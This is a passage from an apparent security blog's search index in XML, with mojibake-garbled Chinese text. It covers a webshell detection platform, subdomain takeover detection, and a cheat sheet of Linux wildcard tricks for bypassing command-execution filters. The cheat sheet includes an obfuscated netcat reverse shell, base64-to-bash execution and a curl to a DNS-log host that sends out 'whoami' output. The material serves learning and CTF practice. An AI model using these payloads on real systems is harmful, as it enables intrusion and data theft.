<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[webshellæ£€æµ‹å¹³å°]]></title>
      <url>/2018/07/19/webshell%E6%A3%80%E6%B5%8B%E5%B9%B3%E5%8F%B0/</url>
      <content type="html"><![CDATA[<h1 id="0x01-ç›¸å…³æŠ€æœ¯"><a href="#0x01-ç›¸å…³æŠ€æœ¯" class="headerlink" title="0x01 ç›¸å…³æŠ€æœ¯"></a>0x01 ç›¸å…³æŠ€æœ¯</h1><ul>
<li><p>Python</p>
<p>ç¼–ç¨‹è¯­è¨€ä½¿ç”¨pythonå¼€å‘ï¼Œçº¯å±ä¸ºäº†å­¦ä¹ ç¼–ç¨‹ã€‚</p>
</li>
<li><p>Flask</p>
<p>ä½¿ç”¨Flaskä½œä¸ºWebå¼€å‘å¾®æ¡†æ¶ï¼Œäº¤ä¸å…¶ä»–Pythonæ¡†æ¶ï¼Œå…·æœ‰ç®€ä¾¿ã€æ˜“æ‰©å±•ç­‰ä¼˜ç‚¹ã€‚å…·ä½“å¯çœ‹ï¼š<a href="http://docs.jinkan.org/docs/flask/" target="_blank" rel="external">Flaskä¸­æ–‡æ–‡æ¡£</a></p>
</li>
<li><p>MySQL</p>
<p>MySQL æ˜¯æœ€æµè¡Œçš„å…³ç³»å‹æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼Œåœ¨WEBåº”ç”¨æ–¹é¢ MySQL æ˜¯æœ€å¥½çš„RDBMS(Relational Database Management Systemï¼šå…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ)åº”ç”¨è½¯ä»¶ä¹‹ä¸€ã€‚æ–‡æ¡£å‚è€ƒï¼š<a href="MySQL æ˜¯æœ€æµè¡Œçš„å…³ç³»å‹æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼Œåœ¨WEBåº”ç”¨æ–¹é¢ MySQL æ˜¯æœ€å¥½çš„RDBMS(Relational Database Management Systemï¼šå…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ">MySQLæ•™ç¨‹</a>åº”ç”¨è½¯ä»¶ä¹‹ä¸€)</p>
</li>
<li><p>inotify</p>
<p>ä» Linux 2.6.13 å†…æ ¸å¼€å§‹ï¼ŒLinux å°±æ¨å‡ºäº† <em>inotify</em>ï¼Œå…è®¸ç›‘æ§ç¨‹åºæ‰“å¼€ä¸€ä¸ªç‹¬ç«‹æ–‡ä»¶æè¿°ç¬¦ï¼Œå¹¶é’ˆå¯¹äº‹ä»¶é›†ç›‘æ§ä¸€ä¸ªæˆ–è€…å¤šä¸ªæ–‡ä»¶ï¼Œä¾‹å¦‚æ‰“å¼€ã€å…³é—­ã€ç§»åŠ¨/é‡å‘½åã€åˆ é™¤ã€åˆ›å»ºæˆ–è€…æ”¹å˜å±æ€§ï¼Œæ–‡æ¡£å‚è€ƒï¼š<a href="https://www.ibm.com/developerworks/cn/linux/l-inotify/index.html" target="_blank" rel="external">ç”¨ inotify ç›‘æ§ Linux æ–‡ä»¶ç³»ç»Ÿäº‹ä»¶</a></p>
</li>
</ul>
<h1 id="0x02-æ‰«ææµç¨‹"><a href="#0x02-æ‰«ææµç¨‹" class="headerlink" title="0x02 æ‰«ææµç¨‹"></a>0x02 æ‰«ææµç¨‹</h1><p><img src="http://oa8y5guqs.bkt.clouddn.com/webshell.png" alt=""></p>
<h1 id="0x03-å…·ä½“å®ç°"><a href="#0x03-å…·ä½“å®ç°" class="headerlink" title="0x03 å…·ä½“å®ç°"></a>0x03 å…·ä½“å®ç°</h1><h2 id="æ–‡ä»¶ç›‘æ§æ¨¡å—"><a href="#æ–‡ä»¶ç›‘æ§æ¨¡å—" class="headerlink" title="æ–‡ä»¶ç›‘æ§æ¨¡å—"></a>æ–‡ä»¶ç›‘æ§æ¨¡å—</h2><p><img src="http://oa8y5guqs.bkt.clouddn.com/inotify.png" alt=""></p>
<p>ä½¿ç”¨inotifyä¸€ç›´å¾ªç¯ç›‘å¬æ–‡ä»¶ä¸Šä¼ çš„ç›®å½•ï¼Œå‘ç°æ–°æ–‡ä»¶ç«‹å³è°ƒç”¨æ‰«æå¼•æ“æ£€æµ‹ã€‚</p>
<h2 id="æŸ¥æ€æ¨¡å—"><a href="#æŸ¥æ€æ¨¡å—" class="headerlink" title="æŸ¥æ€æ¨¡å—"></a>æŸ¥æ€æ¨¡å—</h2><p><img src="http://oa8y5guqs.bkt.clouddn.com/all.png" alt=""></p>
<p>å…ˆåˆ¤æ–­æ–‡ä»¶å¤§å°ï¼Œæ–‡ä»¶è¿‡å¤§åˆ™è·³è¿‡ã€‚</p>
<p>æ£€æµ‹è§„åˆ™æœ‰ä¸¤ç§ï¼š</p>
<ul>
<li><p>å½“typeç­‰äº1æ—¶ï¼Œæ˜¯ä½¿ç”¨çš„æ˜¯é™æ€åŒ¹é…ï¼›</p>
</li>
<li><p>å½“typeç­‰äº2æ—¶ï¼Œæ˜¯ä½¿ç”¨çš„æ­£åˆ™åŒ¹é…ï¼Œæ­£åˆ™åŒ¹é…éœ€æ»¡è¶³æ‰€æœ‰æ­£åˆ™æ¡ä»¶æ‰ç®—æˆåŠŸåŒ¹é…ï¼›</p>
</li>
</ul>
<p>æ‰«æç»“æŸåï¼Œå°†ç»“æœæ’å…¥æ•°æ®åº“ã€‚</p>
<p>å…¶ä¸­æ£€æµ‹è§„åˆ™ä½¿ç”¨çš„æ˜¯@haozigeä¹‹å‰é€†å‘çš„é˜¿é‡Œäº‘ã€è…¾è®¯äº‘çš„webshellæ£€æµ‹è§„åˆ™ï¼š</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/rule.png" alt=""></p>
<h1 id="0x04-Todo"><a href="#0x04-Todo" class="headerlink" title="0x04 Todo"></a>0x04 Todo</h1><p>1ã€æœºå™¨å­¦ä¹ æ£€æµ‹webshellï¼š<a href="https://xz.aliyun.com/t/2016" target="_blank" rel="external">æ·±åº¦å­¦ä¹ PHP webshellæŸ¥æ€å¼•æ“demo</a></p>
<p>2ã€è¯­ä¹‰åˆ†æï¼ˆæ—è·¯ã€æ²™ç›’ï¼‰æ£€æµ‹webshellï¼š<a href="http://byd.dropsec.xyz/2017/04/27/Webshell%E6%9F%A5%E6%9D%80%E7%9A%84%E6%96%B0%E6%80%9D%E8%B7%AF/">WebshellæŸ¥æ€çš„æ–°æ€è·¯</a></p>
<p>3ã€åŸºäºæµé‡æ¨¡å¼æ£€æµ‹webshellï¼ˆåšagentçš„è¯å¾ˆæœ‰ç”¨ï¼‰</p>
<p>4ã€é€†å‘ç®—æ³•+é™æ€åŒ¹é…æ£€æµ‹webshellï¼š<a href="http://www.d99net.net/" target="_blank" rel="external">Dç›¾webshellæŸ¥æ€</a></p>
]]></content>
      
        
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> Python </tag>
            
            <tag> è‡ªåŠ¨åŒ– </tag>
            
            <tag> MySQL </tag>
            
            <tag> Flask </tag>
            
            <tag> inotify </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[å­åŸŸååŠ«æŒï¼ˆSubdomain takeoverï¼‰]]></title>
      <url>/2018/07/12/%E5%AD%90%E5%9F%9F%E5%90%8D%E5%8A%AB%E6%8C%81%EF%BC%88Subdomain-takeover%EF%BC%89/</url>
      <content type="html"><![CDATA[<p>å­¦åˆ°äº†ä¸€ä¸ªæ–°çš„æ¼æ´ç±»å‹ï¼Œè®°å½•å­¦ä¹ ä¸‹</p>
<h1 id="0x01-åŸŸåè§£æ"><a href="#0x01-åŸŸåè§£æ" class="headerlink" title="0x01 åŸŸåè§£æ"></a>0x01 åŸŸåè§£æ</h1><p>åŸŸåè§£ææ˜¯ç”±DNSåè®®å®Œæˆçš„ï¼ŒåŒ…å«äº†å¤šç§è®°å½•ç±»å‹ï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li><p>A (Address) è®°å½•ï¼šæŒ‡æ˜åŸŸåå¯¹åº”çš„å“ªä¸ªIP</p>
</li>
<li><p>NSè®°å½•ï¼šæŒ‡æ˜ç”±å“ªå°æœåŠ¡å™¨å¯¹è¯¥åŸŸåè¿›è¡Œè§£æ</p>
</li>
<li><p>CNAMEè®°å½•ï¼šåˆ«åè®°å½•ï¼Œå°†ä¸€ä¸ªåŸŸåæ˜ å°„åˆ°å¦ä¸€ä¸ªåŸŸåçš„è®°å½•ï¼ˆæ¯”å¦‚ï¼šå¼ æ™“æ˜çš„å°åå«å°æ˜ï¼Œå°åå’Œæ™“æ˜éƒ½æ˜¯åŒä¸€ä¸ªäººï¼‰</p>
</li>
</ul>
<h1 id="0x02-å­åŸŸååŠ«æŒåŸç†"><a href="#0x02-å­åŸŸååŠ«æŒåŸç†" class="headerlink" title="0x02 å­åŸŸååŠ«æŒåŸç†"></a>0x02 å­åŸŸååŠ«æŒåŸç†</h1><p>æ€ä¹ˆç®€å•æ€ä¹ˆè¯´ï¼š</p>
<blockquote>
<p>æ¯”å¦‚ï¼šå­åŸŸåtest.example.comé€šè¿‡CNAMEè®°å½•æŒ‡å‘ä¸€ä¸ªæ¯”å¦‚testcdn.img.aliyun.comåŸŸåï¼Œä½†è¯¥ä¸»æœºåå·²ç»ä¸å­˜åœ¨æˆ–è€…è¿‡æœŸäº†ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ³¨å†Œã€åˆ›å»ºä¸€ä¸ªè¿™ä¸ªä¸å­˜åœ¨çš„testcdn.img.aliyun.comåŸŸåï¼Œè¾¾åˆ°å­åŸŸååŠ«æŒçš„ç›®çš„</p>
</blockquote>
<h1 id="0x03-æ¼æ´æ£€æµ‹"><a href="#0x03-æ¼æ´æ£€æµ‹" class="headerlink" title="0x03 æ¼æ´æ£€æµ‹"></a>0x03 æ¼æ´æ£€æµ‹</h1><p>å­åŸŸååŠ«æŒæ¼æ´æ£€æµ‹æœ‰ä¸‰ç§æ–¹æ³•ï¼š</p>
<h2 id="1ã€ä½¿ç”¨digã€nslookup"><a href="#1ã€ä½¿ç”¨digã€nslookup" class="headerlink" title="1ã€ä½¿ç”¨digã€nslookup"></a>1ã€ä½¿ç”¨digã€nslookup</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"># nslookup ping.ubnt.com 8.8.8.8</div><div class="line">Server:     8.8.8.8</div><div class="line">Address:    8.8.8.8#53</div><div class="line"></div><div class="line">Non-authoritative answer:</div><div class="line">ping.ubnt.com   canonical name = dl.ubnt.com.</div><div class="line">dl.ubnt.com canonical name = d2cnv2pop2xy4v.cloudfront.net.</div><div class="line">Name:   d2cnv2pop2xy4v.cloudfront.net</div><div class="line">Address: 54.192.96.244</div><div class="line"></div><div class="line"># dig example.com  | grep CNAME</div><div class="line">example.com. 3027 IN  CNAME   example.cloudfront.net.</div></pre></td></tr></table></figure>
<p>ç„¶åè®¿é—®å‡ºç°çš„CNAMEè®°å½•å€¼ï¼Œå¦‚æœæ˜¾ç¤ºä¸å­˜åœ¨ï¼Œé‚£ä¹ˆCongratulationsï¼</p>
<h2 id="2ã€ç›´æ¥è®¿é—®å­åŸŸå"><a href="#2ã€ç›´æ¥è®¿é—®å­åŸŸå" class="headerlink" title="2ã€ç›´æ¥è®¿é—®å­åŸŸå"></a>2ã€ç›´æ¥è®¿é—®å­åŸŸå</h2><p>å¦‚æœå‡ºç°ç±»ä¼¼ä¸‹é¢è¿™ç§æƒ…å†µï¼Œé‚£ä¹ˆCongratulationsï¼</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/takeover.png" alt=""></p>
<h2 id="3ã€ä½¿ç”¨å·¥å…·-aquatone"><a href="#3ã€ä½¿ç”¨å·¥å…·-aquatone" class="headerlink" title="3ã€ä½¿ç”¨å·¥å…·-aquatone"></a>3ã€ä½¿ç”¨å·¥å…·-aquatone</h2><p>ç›´æ¥ä½¿ç”¨<code>aquatone-takeoverâ€Šâ€”d target.com</code>å³å¯</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/takeover1.png" alt=""></p>
<h1 id="0x04-æ¼æ´å±å®³"><a href="#0x04-æ¼æ´å±å®³" class="headerlink" title="0x04 æ¼æ´å±å®³"></a>0x04 æ¼æ´å±å®³</h1><h2 id="1ã€è®¤è¯åŠ«æŒã€é’“é±¼"><a href="#1ã€è®¤è¯åŠ«æŒã€é’“é±¼" class="headerlink" title="1ã€è®¤è¯åŠ«æŒã€é’“é±¼"></a>1ã€è®¤è¯åŠ«æŒã€é’“é±¼</h2><p>ç”±äºæ”»å‡»è€…å·²ç»æ§åˆ¶äº†è¯¥å­åŸŸåï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥æ„é€ ç‰¹å®šçš„é¡µé¢è¯±å¯¼ç”¨æˆ·æ“ä½œï¼Œæ¯”å¦‚ç™»é™†è¡¨å•ã€å¯†ç è¡¨å•ç­‰ï¼Œç”±äºæ˜¯å®Œå…¨æ­£å¸¸çš„å¯ä¿¡çš„åŸŸåï¼Œæ‰€ä»¥å¾ˆéš¾ä»¥åˆ†åˆ«æ˜¯å¦å­˜åœ¨é’“é±¼ã€‚</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/takeover2.png" alt=""></p>
<h2 id="2ã€ä¼šè¯åŠ«æŒ"><a href="#2ã€ä¼šè¯åŠ«æŒ" class="headerlink" title="2ã€ä¼šè¯åŠ«æŒ"></a>2ã€ä¼šè¯åŠ«æŒ</h2><p>è¿™ç§å¯¹é‚£äº›å¤§å‹ä¼ä¸šå±å®³å·¨å¤§ï¼Œç°åœ¨å¾ˆå¤šç½‘ç«™ä½¿ç”¨å•ç‚¹ç™»é™†ï¼ˆSSOï¼‰ï¼Œé‚£ä¹ˆCookieå°±æ˜¯åœ¨æ•´ä¸ªåŸŸä¸­å…±äº«çš„ï¼Œé‚£ä¹ˆæ”»å‡»è€…åªéœ€è¦æ¥å—åˆ°ç”¨æˆ·çš„Cookieï¼Œå³å¯æ“ä½œå…¶ä»–åŸŸåäº†ã€‚</p>
]]></content>
      
        
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> å­åŸŸååŠ«æŒ </tag>
            
            <tag> takeover </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[å‘½ä»¤æ‰§è¡Œç»•è¿‡ä¹‹Linuxé€šé…ç¬¦]]></title>
      <url>/2018/05/29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E4%B9%8BLinux%E9%80%9A%E9%85%8D%E7%AC%A6/</url>
      <content type="html"><![CDATA[<p>å‰å‡ å¤©åœ¨å¾®åšå’Œå…¬ä¼—å·ä¸Šçœ‹åˆ°ä¸€äº›ä½¿ç”¨Linuxé€šé…ç¬¦/globæ¨¡å¼æ¥ç»•è¿‡å‘½ä»¤æ‰§è¡Œçš„æ–¹å¼ï¼Œæ„Ÿè§‰å¾ˆä¸é”™ï¼Œå­¦ä¹ æ€»ç»“ä¸‹ã€‚</p>
<p>é¦–å…ˆå…ˆäº†è§£ä¸‹ä»€ä¹ˆæ˜¯Linux shell é€šé…ç¬¦/globæ¨¡å¼:</p>
<p><strong>æ¦‚å¿µï¼š</strong></p>
<blockquote>
<p>glob æ¨¡å¼ï¼ˆglobbingï¼‰ä¹Ÿè¢«ç§°ä¹‹ä¸º shell é€šé…ç¬¦ï¼Œåå­—çš„èµ·æºæ¥è‡ªäº Unix V6 ä¸­çš„ <code>/etc/glob</code> ï¼ˆè¯¦è§ man æ–‡æ¡£ï¼‰ã€‚glob æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ¨¡å¼åŒ¹é…ï¼Œæœ€å¸¸è§çš„æ˜¯é€šé…ç¬¦æ‹“å±•ï¼Œä¹Ÿå¯ä»¥å°† glob æ¨¡å¼è®¾ä¸ºç²¾ç®€äº†çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œåœ¨æœ€æ–°çš„ CentOS 7 ä¸­å·²ç»åˆ é™¤äº† glob çš„ç›¸å…³æè¿°æ–‡æ¡£ï¼Œåˆ é™¤çš„åŸå› ç”±äº glob å·²ç»æ•´åˆåˆ°äº† shell ä¹‹ä¸­ï¼Œç„¶åå°±æœ‰äº† shell é€šé…ç¬¦ã€‚<strong>shell é€šé…ç¬¦ / glob æ¨¡å¼é€šå¸¸ç”¨æ¥åŒ¹é…ç›®å½•ä»¥åŠæ–‡ä»¶ï¼Œè€Œä¸æ˜¯æ–‡æœ¬ï¼ï¼ï¼</strong></p>
</blockquote>
<p><strong>è¯­æ³•ï¼š</strong></p>
<table>
<thead>
<tr>
<th>å­—ç¬¦</th>
<th>è§£é‡Š</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>*</code></td>
<td>åŒ¹é…ä»»æ„é•¿åº¦ä»»æ„å­—ç¬¦</td>
</tr>
<tr>
<td><code>?</code></td>
<td>åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦</td>
</tr>
<tr>
<td><code>[list]</code></td>
<td>åŒ¹é…æŒ‡å®šèŒƒå›´å†…ï¼ˆlistï¼‰ä»»æ„å•ä¸ªå­—ç¬¦ï¼Œä¹Ÿå¯ä»¥æ˜¯å•ä¸ªå­—ç¬¦ç»„æˆçš„é›†åˆ</td>
</tr>
<tr>
<td><code>[^list]</code></td>
<td>åŒ¹é…æŒ‡å®šèŒƒå›´å¤–çš„ä»»æ„å•ä¸ªå­—ç¬¦æˆ–å­—ç¬¦é›†åˆ</td>
</tr>
<tr>
<td><code>[!list]</code></td>
<td>åŒ<code>[^list]</code></td>
</tr>
<tr>
<td><code>{str1,str2,â€¦}</code></td>
<td>åŒ¹é… srt1 æˆ–è€… srt2 æˆ–è€…æ›´å¤šå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥æ˜¯é›†åˆ</td>
</tr>
</tbody>
</table>
<p><strong>ä¸“ç”¨å­—ç¬¦é›†</strong></p>
<table>
<thead>
<tr>
<th>å­—ç¬¦</th>
<th>æ„ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>[:alnum:]</code></td>
<td>ä»»æ„æ•°å­—æˆ–è€…å­—æ¯</td>
</tr>
<tr>
<td><code>[:alpha:]</code></td>
<td>ä»»æ„å­—æ¯</td>
</tr>
<tr>
<td><code>[:space:]</code></td>
<td>ç©ºæ ¼</td>
</tr>
<tr>
<td><code>[:lower:]</code></td>
<td>å°å†™å­—æ¯</td>
</tr>
<tr>
<td><code>[:digit:]</code></td>
<td>ä»»æ„æ•°å­—</td>
</tr>
<tr>
<td><code>[:upper:]</code></td>
<td>ä»»æ„å¤§å†™å­—æ¯</td>
</tr>
<tr>
<td><code>[:cntrl:]</code></td>
<td>æ§åˆ¶ç¬¦</td>
</tr>
<tr>
<td><code>[:graph:]</code></td>
<td>å›¾å½¢</td>
</tr>
<tr>
<td><code>[:print:]</code></td>
<td>å¯æ‰“å°å­—ç¬¦</td>
</tr>
<tr>
<td><code>[:punct:]</code></td>
<td>æ ‡ç‚¹ç¬¦å·</td>
</tr>
<tr>
<td><code>[:xdigit:]</code></td>
<td>åå…­è¿›åˆ¶æ•°</td>
</tr>
<tr>
<td><code>[:blank:]</code></td>
<td>ç©ºç™½å­—ç¬¦ï¼ˆæœªéªŒè¯ï¼‰</td>
</tr>
</tbody>
</table>
<p>Linux shell å…ƒå­—ç¬¦ï¼Œåœ¨ä½¿ç”¨é€šé…ç¬¦æ—¶å¦‚æœæ²¡æœ‰è¿›è¡Œè½¬ä¹‰å¯èƒ½å°±ä¼šè¢«è¾¨è¯†ä¸ºå…ƒå­—ç¬¦</p>
<table>
<thead>
<tr>
<th>å­—ç¬¦</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>IFS</code></td>
<td>ç”± <code>&lt; space &gt;</code> æˆ– <code>&lt; tab &gt;</code>æˆ– <code>&lt; enter &gt;</code> ä¸‰è€…ä¹‹ä¸€ç»„æˆ</td>
</tr>
<tr>
<td><code>CR</code></td>
<td>ç”± <code>&lt; enter &gt;</code> äº§ç”Ÿ</td>
</tr>
<tr>
<td><code>=</code></td>
<td>è®¾å®šå˜é‡</td>
</tr>
<tr>
<td><code>$</code></td>
<td>ä½œå˜é‡æˆ–è¿ç®—æ›¿æ¢</td>
</tr>
<tr>
<td><code>&gt;</code></td>
<td>é‡å¯¼å‘æ ‡å‡†è¾“å‡º</td>
</tr>
<tr>
<td><code>&lt;</code></td>
<td>é‡å¯¼å‘æ ‡å‡†è¾“å…¥</td>
</tr>
<tr>
<td>`\</td>
<td>`</td>
<td>å‘½ä»¤ç®¡çº¿</td>
</tr>
<tr>
<td><code>&amp;</code></td>
<td>é‡å¯¼å‘æ–‡ä»¶æè¿°ç¬¦ï¼Œæˆ–å°†å‘½ä»¤é™é»˜æ‰§è¡Œ</td>
</tr>
<tr>
<td><code>( )</code></td>
<td>å°†å…¶å†…çš„å‘½ä»¤ç½®äº nested subshell æ‰§è¡Œï¼Œæˆ–ç”¨äºè¿ç®—æˆ–å‘½ä»¤æ›¿æ¢</td>
</tr>
<tr>
<td><code>{ }</code></td>
<td>å°†å…¶å†…çš„å‘½ä»¤ç½®äº non-named function ä¸­æ‰§è¡Œï¼Œæˆ–ç”¨åœ¨å˜é‡æ›¿æ¢çš„ç•Œå®šèŒƒå›´</td>
</tr>
<tr>
<td><code>;</code></td>
<td>åœ¨å‰ä¸€ä¸ªå‘½ä»¤ç»“æŸæ—¶ï¼Œè€Œå¿½ç•¥å…¶è¿”å›å€¼ï¼Œç»§ç»­æ‰§è¡Œä¸‹ä¸€ä¸ªå‘½ä»¤</td>
</tr>
<tr>
<td><code>&amp;&amp;</code></td>
<td>åœ¨å‰ä¸€ä¸ªå‘½ä»¤ç»“æŸæ—¶ï¼Œè‹¥è¿”å›å€¼ä¸º trueï¼Œç»§ç»­æ‰§è¡Œä¸‹ä¸€ä¸ªå‘½ä»¤</td>
</tr>
<tr>
<td>`\</td>
<td>\</td>
<td>`</td>
<td>åœ¨å‰ä¸€ä¸ªå‘½ä»¤ç»“æŸæ—¶ï¼Œè‹¥è¿”å›å€¼ä¸º falseï¼Œç»§ç»­æ‰§è¡Œä¸‹ä¸€ä¸ªå‘½ä»¤</td>
</tr>
<tr>
<td><code>!</code></td>
<td>æ‰§è¡Œ history ä¸­çš„å‘½ä»¤</td>
</tr>
</tbody>
</table>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<p><em>ä¸¾å‡ ä¸ªç®€å•çš„ä¾‹å­ï¼Œä¸¾ä¸€åä¸‰ï¼ŒåŒç†ï¼Œå„ç§æ··åˆç»“åˆæ•ˆæœæ›´ä½³ï¼</em></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"> w2n1ck@w2n1ck ~/Desktop/shell î‚° ls a*?</div><div class="line">abc.txt</div><div class="line"> w2n1ck@w2n1ck ~/Desktop/shell î‚° /???/[l]s</div><div class="line">12.txt	abc.txt</div><div class="line"> w2n1ck@w2n1ck ~/Desktop/shell î‚° /???/[:lower:]s</div><div class="line">12.txt	abc.txt</div><div class="line">å†æ¯”å¦‚ï¼š</div><div class="line">/?s?/???/[n]c 2130706433 8888 -e /???/b??h</div><div class="line">...</div></pre></td></tr></table></figure>
<p><strong>å…¶ä»–ç»•è¿‡æ–¹å¼</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">ls | id</div><div class="line">ls ; id    åœ¨shellä¸­ï¼Œæ‹…ä»»&quot;è¿ç»­æŒ‡ä»¤&quot;åŠŸèƒ½çš„ç¬¦å·å°±æ˜¯&quot;åˆ†å·&quot;</div><div class="line">ls &amp; id</div><div class="line">ls å›è½¦ id</div><div class="line">ls `id`   </div><div class="line">ls ` id`   å‰é¢åŠ äº†ä¸€ä¸ªç©ºæ ¼</div><div class="line">ls `\id`   åæ–œæ   i\dç­‰ä»·äºid</div><div class="line">ls $(id)</div><div class="line">ls | a=i;b=d;$a$b   æ‹¼æ¥</div><div class="line">ls | echo aWQ=| base64 -d | bash   åˆ©ç”¨base64</div><div class="line">`echo &quot;aWQ=&quot;|base64 -d`</div><div class="line">ls | curl xxx.ceye.io/`whoami`   åˆ©ç”¨dnslogæˆ–è€…http web log</div><div class="line">cat&lt;1.txt</div><div class="line">cat$IFS$91.txt</div><div class="line">cat$&#123;IFS&#125;1.txt</div><div class="line">cat$IFS1.txt</div><div class="line">%0acat%091.txt</div><div class="line">w&apos;h&apos;o&apos;am&apos;i</div><div class="line">w&quot;h&quot;o&quot;am&quot;i</div><div class="line">who$@ami</div><div class="line">echo i$@d|$0</div><div class="line">w$@h$@o$@a$@m$@i</div></pre></td></tr></table></figure>
<p><strong>æ³¨æ„äº‹é¡¹</strong></p>
<ul>
<li>åœ¨ä½¿ç”¨ä¸“å±å­—ç¬¦é›†çš„æ—¶å€™ï¼Œå­—ç¬¦é›†ä¹‹å¤–è¿˜éœ€è¦ç”¨ [ ] æ¥åŒ…å«ä½ï¼Œå¦åˆ™ä¸“ç”¨å­—ç¬¦é›†ä¸ä¼šç”Ÿæ•ˆï¼Œä¾‹å¦‚ [[:space:]]</li>
<li>æƒ³è¦è½¬ä¹‰çš„æ—¶å€™ï¼Œå•å¼•å·ä¸åŒå¼•å·ä½¿ç”¨æ–¹æ³•æ˜¯ä¸åŒçš„ï¼Œå•å¼•å·ä¼šè½¬ä¹‰æ‰€æœ‰å­—ç¬¦ï¼Œè€Œä¸”å•å¼•å·ä¸­é—´ä¸å…è®¸å†å‡ºç°å•å¼•å·ï¼ŒåŒå¼•å·å…è®¸å‡ºç°ç‰¹å®šçš„ shell å…ƒå­—ç¬¦ï¼Œå…·ä½“å­—ç¬¦å¯ä»¥è‡ªè¡ŒæŸ¥è¯¢</li>
<li>åœ¨ä½¿ç”¨èŠ±æ‹¬å· {} çš„æ—¶å€™ï¼Œé‡Œé¢çš„å•ä¸ªå­—ç¬¦ä¸²éœ€è¦ä½¿ç”¨å•å¼•å·æˆ–è€…åŒå¼•å·æ‹¬ä½ï¼Œå¦åˆ™å°±ä¼šè§†ä¸ºå¤šä¸ªçš„å•ä¸ªå­—ç¬¦</li>
</ul>
<p><strong>Refererï¼š</strong></p>
<p><a href="https://www.cnblogs.com/divent/archive/2016/08/11/5762154.html" target="_blank" rel="external">https://www.cnblogs.com/divent/archive/2016/08/11/5762154.html</a></p>
<p><a href="https://medium.com/secjuice/waf-evasion-techniques-718026d693d8" target="_blank" rel="external">https://medium.com/secjuice/waf-evasion-techniques-718026d693d8</a></p>
]]></content>
      
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WAFç»•è¿‡ </tag>
            
            <tag> å‘½ä»¤æ‰§è¡Œ </tag>
            
            <tag> linux </tag>
            
            <tag> é€šé…ç¬¦ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PrxoyPool-å…è´¹ä»£ç†æ± çš„è®¾è®¡ä¸å®ç°]]></title>
      <url>/2018/04/27/PrxoyPool-%E5%85%8D%E8%B4%B9%E4%BB%A3%E7%90%86%E6%B1%A0%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨è¿›è¡Œæ¸—é€æµ‹è¯•ã€æ¼æ´æŒ–æ˜çš„æ—¶å€™ï¼Œä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·æ˜¯å¿…é¡»çš„ä¸€æ­¥ï¼Œä½†æ˜¯ä»¤äººğŸ˜ çš„æ˜¯ï¼Œç»å¸¸ç”±äºæ‰«æç­‰åŸå› å¯¼è‡´IPè¢«banï¼Œè¿™æ˜¯æˆ‘ä»¬æœ€ä¸æƒ³çœ‹åˆ°çš„ã€‚æ‰€ä»¥æœ¬ç€å­¦ä¹ ç¼–ç¨‹çš„ç›®çš„ï¼Œæ ¹æ®ç½‘ä¸Šæœç´¢çš„èµ„æ–™ï¼Œä¸œæ‹¼è¥¿å‡‘çš„å¼€å‘äº†è¿™ä¸ªç³»ç»Ÿã€‚</p>
<h2 id="0x01-æ¶‰åŠæŠ€æœ¯"><a href="#0x01-æ¶‰åŠæŠ€æœ¯" class="headerlink" title="0x01 æ¶‰åŠæŠ€æœ¯"></a>0x01 æ¶‰åŠæŠ€æœ¯</h2><ul>
<li><p>Python3</p>
